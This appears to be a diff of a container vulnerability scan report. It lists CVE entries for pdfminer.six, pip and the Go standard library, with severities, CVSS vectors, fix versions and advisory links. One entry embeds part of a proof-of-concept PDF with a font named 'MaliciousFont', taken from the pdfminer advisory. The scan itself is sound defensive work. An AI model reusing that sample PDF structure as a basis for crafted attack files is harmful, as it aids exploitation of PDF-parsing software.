+│                       │     │                   /Type /Page
+│                       │     │                   /Parent 2 0 R
+│                       │     │                   /MediaBox [0 0 612 792]
+│                       │     │                   /Contents 4 0 R
+│                       │     │                   /Resources
+│                       │     │                   /Font
+│                       │     │                   /F1 5 0 R
+│                       │     │                   4 0 obj
+│                       │     │                   /Length 44
+│                       │     │                   stream
+│                       │     │                   BT
+│                       │     │                   /F1 12 Tf
+│                       │     │                   100 700 Td
+│                       │     │                   (Malicious PDF) Tj
+│                       │     │                   ET
+│                       │     │                   endstream
+│                       │     │                   6 0 obj
+│                       │     │                   /Subtype /CIDFontType2
+│                       │     │                   /BaseFont /MaliciousFont
+│                       │     │                   /CIDSystemInfo
+│                       │     │                   /Registry (Adobe)
+│                       │     │                   /Ordering (Identity)
+│                       │     │                   /Supplement 0
+│                       │     │                   /FontDescriptor 7 0 R
+│                       │     │                   7 0 obj
+│                       │     │                   /Type /FontDescriptor
+│                       │     │                   /FontName /MaliciousFont
+│                       │     │                   /Flags 4
+│                       │     │                   /FontBBox [-1000 -1000 1000 1000]
+│                       │     │                   /ItalicAngle 0
+│                       │     │                   /Ascent 1000
+│                       │     │                   /Descent -200
+│                       │     │                   /CapHeight 800
+│                       │     │                   /StemV 80
+│                       │     │                   xref
+│                       │     │                   0 8
+│                       │     │                   0000000000 65535 f
+│                       │     │                   0000000009 00000 n
+│                       │     │                   0000000058 00000 n
+│                       │     │                   0000000115 00000 n
+│                       │     │                   0000000274 00000 n
+│                       │     │                   0000000370 00000 n
+│                       │     │                   0000000503 00000 n
+│                       │     │                   0000000673 00000 n
+│                       │     │                   trailer
+│                       │     │                   /Size 8
+│                       │     │                   /Root 1 0 R
+│                       │     │                   startxref
+│                       │     │                   871
+│                       │     │                   %%EOF 
+│                       │     ├ Severity        : HIGH 
+│                       │     ├ VendorSeverity   ─ ghsa: 3 
+│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H 
+│                       │     │                         ╰ V3Score : 8.6 
+│                       │     ├ References       ╭ [0]: https://github.com/pdfminer/pdfminer.six 
+│                       │     │                  ├ [1]: https://github.com/pdfminer/pdfminer.six/commit/b808ee0
+│                       │     │                  │      5dd7f0c8ea8ec34bdf394d40e63501086 
+│                       │     │                  ╰ [2]: https://github.com/pdfminer/pdfminer.six/security/advis
+│                       │     │                         ories/GHSA-wf5f-4jwr-ppcp 
+│                       │     ├ PublishedDate   : 2025-11-07T20:52:24Z 
+│                       │     ╰ LastModifiedDate: 2025-11-07T20:52:24Z 
+│                       ╰ [2] ╭ VulnerabilityID : CVE-2025-8869 
 │                             ├ PkgName         : pip 
 │                             ├ PkgPath         : opt/scancode-toolkit/lib/python3.12/site-packages/pip-25.0.1.
 │                             │                   dist-info/METADATA 
@@ -21040,79 +21477,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4013 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.74Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.74Z 
-│                       ├ [14] ╭ VulnerabilityID : CVE-2025-58189 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : f1435be1373e471b 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains a ... 
-│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains attacker controlled information (the ALPN protocols
-│                       │      │                    sent by the client) which is not escaped. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 2 
-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
-│                       │      │                            │           N/A:N 
-│                       │      │                            ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/707776 
-│                       │      │                  ├ [2]: https://go.dev/issue/75652 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4008 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
-│                       ├ [15] ╭ VulnerabilityID : CVE-2025-61723 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : f1435be1373e471b 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearl ... 
-│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearly with respect to the size of the input. This
-│                       │      │                   affects programs which parse untrusted PEM inputs. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 3 
-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
-│                       │      │                            │           N/A:H 
-│                       │      │                            ╰ V3Score : 7.5 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/709858 
-│                       │      │                  ├ [2]: https://go.dev/issue/75676 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4009 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
-│                       ├ [16] ╭ VulnerabilityID : CVE-2025-61724 
+│                       ├ [14] ╭ VulnerabilityID : CVE-2025-61724 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -21149,7 +21514,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4015 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:20.02Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.567Z 
-│                       ├ [17] ╭ VulnerabilityID : CVE-2025-47906 
+│                       ├ [15] ╭ VulnerabilityID : CVE-2025-47906 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -21192,7 +21557,7 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-47906 
 │                       │      ├ PublishedDate   : 2025-09-18T19:15:37.66Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:16.207Z 
-│                       ├ [18] ╭ VulnerabilityID : CVE-2025-58185 
+│                       ├ [16] ╭ VulnerabilityID : CVE-2025-58185 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -21235,6 +21600,92 @@
 │                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-58185 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.45Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.327Z 
+│                       ├ [17] ╭ VulnerabilityID : CVE-2025-58189 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : f1435be1373e471b 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : crypto/tls: go crypto/tls ALPN negotiation error contains
+│                       │      │                   attacker controlled information 
+│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
+│                       │      │                   contains attacker controlled information (the ALPN protocols
+│                       │      │                    sent by the client) which is not escaped. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 2 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                       │      │                  │         │           N/A:N 
+│                       │      │                  │         ╰ V3Score : 5.3 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           L/A:N 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-58189 
+│                       │      │                  ├ [2]: https://go.dev/cl/707776 
+│                       │      │                  ├ [3]: https://go.dev/issue/75652 
+│                       │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
+│                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-4008 
+│                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-58189 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
+│                       ├ [18] ╭ VulnerabilityID : CVE-2025-61723 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : f1435be1373e471b 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : encoding/pem: Quadratic complexity when parsing some invalid
+│                       │      │                    inputs in encoding/pem 
+│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
+│                       │      │                   non-linearly with respect to the size of the input. This
+│                       │      │                   affects programs which parse untrusted PEM inputs. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 3 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                  │         │           N/A:H 
+│                       │      │                  │         ╰ V3Score : 7.5 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           N/A:L 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-61723 
+│                       │      │                  ├ [2]: https://github.com/golang/go/commit/5ce8cd16f3859ec5ac
+│                       │      │                  │      4106ad8ec15d6236f4501b 
+│                       │      │                  ├ [3]: https://go.dev/cl/709858 
+│                       │      │                  ├ [4]: https://go.dev/issue/75676 
+│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4009 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61723 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
 │                       ╰ [19] ╭ VulnerabilityID : CVE-2025-61725 
 │                              ├ PkgID           : stdlib@v1.24.4 
 │                              ├ PkgName         : stdlib 
@@ -24526,79 +24977,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4013 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.74Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.74Z 
-│                       ├ [14] ╭ VulnerabilityID : CVE-2025-58189 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : ebfdcee22f3690eb 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains a ... 
-│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains attacker controlled information (the ALPN protocols
-│                       │      │                    sent by the client) which is not escaped. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 2 
-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
-│                       │      │                            │           N/A:N 
-│                       │      │                            ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/707776 
-│                       │      │                  ├ [2]: https://go.dev/issue/75652 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4008 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
-│                       ├ [15] ╭ VulnerabilityID : CVE-2025-61723 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : ebfdcee22f3690eb 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearl ... 
-│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearly with respect to the size of the input. This
-│                       │      │                   affects programs which parse untrusted PEM inputs. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 3 
-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
-│                       │      │                            │           N/A:H 
-│                       │      │                            ╰ V3Score : 7.5 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/709858 
-│                       │      │                  ├ [2]: https://go.dev/issue/75676 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4009 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
-│                       ├ [16] ╭ VulnerabilityID : CVE-2025-61724 
+│                       ├ [14] ╭ VulnerabilityID : CVE-2025-61724 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -24635,7 +25014,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4015 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:20.02Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.567Z 
-│                       ├ [17] ╭ VulnerabilityID : CVE-2025-47906 
+│                       ├ [15] ╭ VulnerabilityID : CVE-2025-47906 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -24678,7 +25057,7 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-47906 
 │                       │      ├ PublishedDate   : 2025-09-18T19:15:37.66Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:16.207Z 
-│                       ├ [18] ╭ VulnerabilityID : CVE-2025-58185 
+│                       ├ [16] ╭ VulnerabilityID : CVE-2025-58185 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -24721,6 +25100,92 @@
 │                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-58185 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.45Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.327Z 
+│                       ├ [17] ╭ VulnerabilityID : CVE-2025-58189 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : ebfdcee22f3690eb 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : crypto/tls: go crypto/tls ALPN negotiation error contains
+│                       │      │                   attacker controlled information 
+│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
+│                       │      │                   contains attacker controlled information (the ALPN protocols
+│                       │      │                    sent by the client) which is not escaped. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 2 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                       │      │                  │         │           N/A:N 
+│                       │      │                  │         ╰ V3Score : 5.3 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           L/A:N 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-58189 
+│                       │      │                  ├ [2]: https://go.dev/cl/707776 
+│                       │      │                  ├ [3]: https://go.dev/issue/75652 
+│                       │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
+│                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-4008 
+│                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-58189 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
+│                       ├ [18] ╭ VulnerabilityID : CVE-2025-61723 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : ebfdcee22f3690eb 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : encoding/pem: Quadratic complexity when parsing some invalid
+│                       │      │                    inputs in encoding/pem 
+│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
+│                       │      │                   non-linearly with respect to the size of the input. This
+│                       │      │                   affects programs which parse untrusted PEM inputs. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 3 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                  │         │           N/A:H 
+│                       │      │                  │         ╰ V3Score : 7.5 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           N/A:L 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-61723 
+│                       │      │                  ├ [2]: https://github.com/golang/go/commit/5ce8cd16f3859ec5ac
+│                       │      │                  │      4106ad8ec15d6236f4501b 
+│                       │      │                  ├ [3]: https://go.dev/cl/709858 
+│                       │      │                  ├ [4]: https://go.dev/issue/75676 
+│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4009 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61723 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
 │                       ╰ [19] ╭ VulnerabilityID : CVE-2025-61725 
 │                              ├ PkgID           : stdlib@v1.24.4 
 │                              ├ PkgName         : stdlib 
@@ -29737,79 +30202,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4013 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.74Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.74Z 
-│                       ├ [18] ╭ VulnerabilityID : CVE-2025-58189 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : 2bd9acee40f6eed 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains a ... 
-│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
-│                       │      │                   contains attacker controlled information (the ALPN protocols
-│                       │      │                    sent by the client) which is not escaped. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 2 
